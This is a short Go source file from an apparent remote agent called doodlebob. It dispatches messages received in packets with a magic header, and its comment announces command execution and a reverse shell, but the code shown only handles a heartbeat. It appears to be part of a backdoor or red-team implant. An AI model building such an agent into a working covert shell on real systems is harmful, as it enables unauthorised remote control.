// This contains the logic for handling incoming messages from packets with a magic header
// Includes command execution, reverse shell, heartbeat
package agent

import (
	"fmt"

	"github.com/MeHungr/doodlebob/internal/message"
)

// handleMessage takes a message, dissects its fields, and sends the data to the proper function
func handleMessage(msg *message.Message) error {
	// Check that the IP address matches this host
	switch msg.IP {
	case localIP().IP.To4().String():
		switch msg.Type {
		case "heartbeat":
			fmt.Print("beat")
		}
	default:
		fmt.Println("Not correct destination host")
	}
	return nil
}
